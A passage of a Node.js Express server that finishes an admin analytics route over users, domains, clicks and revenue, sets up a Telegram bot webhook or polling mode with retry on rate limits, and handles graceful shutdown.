    const revenueResult = await db.pool.query('SELECT SUM(amount) FROM topups WHERE status = $1', ['completed']);

    res.json({
      totalUsers: parseInt(usersResult.rows[0].count),
      totalDomains: parseInt(domainsResult.rows[0].count),
      totalClicks: parseInt(clicksResult.rows[0].count),
      totalRevenue: parseFloat(revenueResult.rows[0].sum || 0)
    });
  } catch (error) {
    console.error('Admin analytics error:', error);
    res.status(500).json({ error: 'Failed to fetch analytics' });
  }
});

// Telegram Webhook endpoint
if (bot) {
  const WEBHOOK_PATH = `/webhook/${process.env.TELEGRAM_BOT_TOKEN}`;
  app.post(WEBHOOK_PATH, (req, res) => {
    bot.handleUpdate(req.body, res);
  });
}

// ==========================================
// SERVER STARTUP & SHUTDOWN HANDLERS
// ==========================================

const PORT = process.env.PORT || 5000;
const server = app.listen(PORT, "0.0.0.0", async () => {
  const log = L("server");
  log.info({ port: PORT }, "Server started");

  if (bot) {
    // Use webhooks in production, polling in development
    if (process.env.NODE_ENV === "production" || process.env.RENDER) {
      const WEBHOOK_URL = process.env.WEBHOOK_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME}/webhook/${process.env.TELEGRAM_BOT_TOKEN}`;

      // Retry logic for webhook setting (handles 429 rate limits)
      let retries = 0;
      const maxRetries = 3;

      const setWebhookWithRetry = async () => {
        try {
          await bot.telegram.setWebhook(WEBHOOK_URL);
          log.info(`Bot started with webhook: ${WEBHOOK_URL}`);
          return true;
        } catch (error) {
          if (error.response?.error_code === 429 && retries < maxRetries) {
            const retryAfter = error.response.parameters?.retry_after || 2;
            retries++;
            log.warn(`Telegram rate limit hit. Retrying in ${retryAfter} seconds... (attempt ${retries}/${maxRetries})`);
            await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
            return setWebhookWithRetry();
          } else {
            log.error(`Failed to set webhook: ${error.message}`);
            log.info('Server will continue running. Webhook can be set manually later.');
            return false;
          }
        }
      };

      // Don't await - let it retry in background, server continues
      setWebhookWithRetry();
    } else {
      // Development mode - use polling
      await bot.telegram.deleteWebhook();
      bot.launch();
      log.info("Bot started with polling (development mode)");
    }
  } else {
    log.info("Bot not initialized - Telegram token missing. Dashboard available at /dashboard");
  }
});

// Graceful shutdown handlers
process.once("SIGINT", () => {
  const log = L("shutdown");
  log.info("Shutting down gracefully");
  if (bot) bot.stop("SIGINT");
  server.close();
});

process.once("SIGTERM", () => {
  const log = L("shutdown");
  log.info("Shutting down gracefully");
  if (bot) bot.stop("SIGTERM");
  server.close();
});